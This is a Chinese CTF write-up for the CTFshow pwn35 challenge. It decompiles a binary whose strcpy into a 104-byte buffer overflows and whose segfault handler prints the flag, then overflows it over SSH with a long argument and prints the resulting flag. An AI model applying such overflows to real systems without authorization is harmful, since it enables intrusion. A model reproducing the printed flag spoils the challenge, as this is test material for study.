> 常规查看位数和保护：
>
> ```
> tasike@tasike-VM:~/Desktop$ file pwn35
> pwn35: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=4bc7dc523aa0fa7b67257abf83dba476524f4cd1, not stripped
> tasike@tasike-VM:~/Desktop$ checksec pwn35
> [*] '/home/tasike/Desktop/pwn35'
>     Arch:     i386-32-little
>     RELRO:    Partial RELRO
>     Stack:    No canary found
>     NX:       NX enabled
>     PIE:      No PIE (0x8048000)
> ```
>
> 由上可知：32位，动态链接，部分开启RELRO，开启堆栈不可执行
>
> 放入ida32中查看反编译的源码：
> ```c
> int __cdecl main(int argc, const char **argv, const char **envp)
> {
>   FILE *stream; // [esp+0h] [ebp-1Ch]
> 
>   stream = fopen("/ctfshow_flag", "r");
>   if ( !stream )
>   {
>     puts("/ctfshow_flag: No such file or directory.");
>     exit(0);
>   }
>   fgets(flag, 64, stream);
>   signal(11, (__sighandler_t)sigsegv_handler);
>   puts(asc_8048910);
>   puts(asc_8048984);
>   puts(asc_8048A00);
>   puts(asc_8048A8C);
>   puts(asc_8048B1C);
>   puts(asc_8048BA0);
>   puts(asc_8048C34);
>   puts("    * *************************************                           ");
>   puts(aClassifyCtfsho);
>   puts("    * Type  : Stack_Overflow                                          ");
>   puts("    * Site  : https://ctf.show/                                       ");
>   puts("    * Hint  : See what the program does!                              ");
>   puts("    * *************************************                           ");
>   puts("Where is flag?\n");
>   if ( argc <= 1 )
>   {
>     puts("Try again!");
>   }
>   else
>   {
>     ctfshow((char *)argv[1]);
>     printf("QaQ!FLAG IS NOT HERE! Here is your input : %s", argv[1]);
>   }
>   return 0;
> }
> ```
>
> 

显然，不能直接放在本地打，因为本地并没有ctfshow_flag文件，因此运行的时候会执行第6行的if语句然后退出。

> 查询`fgets`函数：
> [fgets函数及其用法，C语言fgets函数详解 (biancheng.net)](https://c.biancheng.net/view/235.html)
>
> **因此11行：从ctfshow_flag中读取64个字符写入flag所指向的内存，返回flag指针**



> 查询`signal(11, (__sighandler_t)sigsegv_handler)`:
>
> 这个函数是用于设置信号处理程序的。它的作用是将信号11（即段错误信号，通常由访问无效内存地址引起）的处理程序设置为`sigsegv_handler`函数。==当程序收到段错误信号时，会调用这个处理程序来处理异常情况。==
>
>  举个例子：
>
> ```c
> #include <stdio.h>
> #include <signal.h>
> #include <stdlib.h>
> 
> void sigsegv_handler(int sig) {
>     printf("捕获到段错误信号 %d，程序即将退出。
> ", sig);
>     exit(1);
> }
> 
> int main() {
>     // 设置段错误信号的处理程序为sigsegv_handler
>     signal(SIGSEGV, (void (*)(int))sigsegv_handler);
> 
>     // 故意访问一个未分配的内存地址
>     char *ptr = (char *)malloc(10 * sizeof(char));
>     *(ptr + 20) = 'a';
> 
>     return 0;
> }
> ```
>
> 我们定义了一个名为`sigsegv_handler`的函数，用于处理段错误信号。当程序收到段错误信号时，它会打印一条消息并退出。在`main`函数中，我们使用`signal`函数将段错误信号的处理程序设置为`sigsegv_handler`。然后，我们故意访问一个未分配的内存地址，这将触发段错误信号。由于我们已经设置了处理程序，程序将捕获到这个信号并调用`sigsegv_handler`函数来处理它。
>
> 输出结果为：
>
> ```
> 捕获到段错误信号 11，程序即将退出。
> ```
>
> 
>
> ida中跟进`sigsegv_handler`函数：
>
> ```c
> void __noreturn sigsegv_handler()
> {
>   fprintf(stderr, "%s\n", flag);
>   fflush(stderr);
>   exit(1);
> }
> ```
>
>  
>
> 查询`fprintf`
>
> fprintf函数是C语言标准库中的一个成员，定义在头文件中。它的主要功能是将格式化的数据写入到指定的流（如文件）中。具体来说，fprintf函数接收三个参数：一个FILE类型的指针stream，一个const char类型的指针format和一个后续的可变参数列表。其中，FILE对象标识了流，format字符串中包含了要被写入到流中的文本，可以包含嵌入的格式标签，这些标签会被随后的附加参数中指定的值替换并进行格式化。
>
> 一个简单的函数调用示例如下：`fprintf (fp, "%d,%6.2f", i, t);`，该语句会将格式化的整数i和浮点数t写入到文件指针fp所指向的文件中。
>
> 需要注意的是，与printf函数不同，fprintf函数的输出是写入到指定的流而不是直接输出到屏幕上。此外，如果写入过程中发生错误，fprintf函数会返回一个负值。
>
>  
>
> 查询`fflush`
>
> `fflush(stderr)` 是用于刷新标准错误流 `stderr` 的缓冲区。
>
> 在 C 语言中，当使用 `printf` 或 `fprintf` 函数向文件流（包括标准输出流 `stdout` 和标准错误流 `stderr`）写入数据时，数据并不会立即被发送到目标设备（如屏幕或文件），而是先被存储在缓冲区中。当缓冲区满或者程序结束时，缓冲区的数据才会被刷新并发送出去。
>
> `fflush(stderr)` 函数的作用是将标准错误流 `stderr` 的缓冲区中的数据立即刷新并发送出去。这样可以确保所有的错误信息能够及时显示出来，而不会被缓存在缓冲区中。
>
>  
>
> **因此第12行的函数的作用就是：当接收到段错误信号时执行`sigsegv_handler`函数,也就是把`flag`写入到标准错误流`stderr`中，然后刷新`stderr`的缓冲区中的数据并发送出去。说白了第12行就是当接收到段错误信息，那么输出`flag`**



> 查询`argc`和`argv`:
>
> [c语言中argc和argv的作用及用法-CSDN博客](https://blog.csdn.net/zhaozhiyuan111/article/details/104050729)
>
> 观察27行到35行，显然我们希望`argc > 1`，也就是在执行命令的时候至少输入两个命令
>
> 而且发现`ctfshow`函数的参数是`(char *)argv[1]`,也就是我们输入的第二个命令
>
> ida跟进`ctfshow`函数:
> ```c
> char *__cdecl ctfshow(char *src)
> {
>   char dest[104]; // [esp+Ch] [ebp-6Ch] BYREF
> 
>   return strcpy(dest, src);
> }
> ```
>
> 显然我们可以让第二个命令超级长从而溢出，程序崩溃从而输出flag



下面是演示：

首先远程连接靶场：

```
tasike@tasike-VM:~/Desktop$ ssh ctfshow@pwn.challenge.ctf.show -p28177
The authenticity of host '[pwn.challenge.ctf.show]:28177 ([124.223.158.81]:28177)' can't be established.
ED25519 key fingerprint is SHA256:OhvXv60rOtDv7fyEuj6QrRcclxTJW912BUI6lVihtkw.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:2: [hashed name]
    ~/.ssh/known_hosts:3: [hashed name]
    ~/.ssh/known_hosts:6: [hashed name]
    ~/.ssh/known_hosts:7: [hashed name]
    ~/.ssh/known_hosts:8: [hashed name]
    ~/.ssh/known_hosts:9: [hashed name]
    ~/.ssh/known_hosts:10: [hashed name]
    ~/.ssh/known_hosts:11: [hashed name]
    (2 additional names omitted)
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[pwn.challenge.ctf.show]:28177,[124.223.158.81]:28177' (ED25519) to the list of known hosts.
ctfshow@pwn.challenge.ctf.show's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-163-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

$
```

发现得到一个交互程序，看看有啥：
```
$ ls
pwnme
```

按照我们之前的想法，第一个命令是执行程序，第二个命令是超长数据：
```
$ ./pwnme aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
    ▄▄▄▄   ▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄            ▄▄                           
  ██▀▀▀▀█  ▀▀▀██▀▀▀  ██▀▀▀▀▀▀            ██                           
 ██▀          ██     ██        ▄▄█████▄  ██▄████▄   ▄████▄  ██      ██
 ██           ██     ███████   ██▄▄▄▄ ▀  ██▀   ██  ██▀  ▀██ ▀█  ██  █▀
 ██▄          ██     ██         ▀▀▀▀██▄  ██    ██  ██    ██  ██▄██▄██ 
  ██▄▄▄▄█     ██     ██        █▄▄▄▄▄██  ██    ██  ▀██▄▄██▀  ▀██  ██▀ 
    ▀▀▀▀      ▀▀     ▀▀         ▀▀▀▀▀▀   ▀▀    ▀▀    ▀▀▀▀     ▀▀  ▀▀  
    * *************************************                           
    * Classify: CTFshow --- PWN --- 入门                              
    * Type  : Stack_Overflow                                          
    * Site  : https://ctf.show/                                       
    * Hint  : See what the program does!                              
    * *************************************                           
Where is flag?

ctfshow{a2e4b0b8-8dd2-4c18-acba-fb47dee8786e}
```

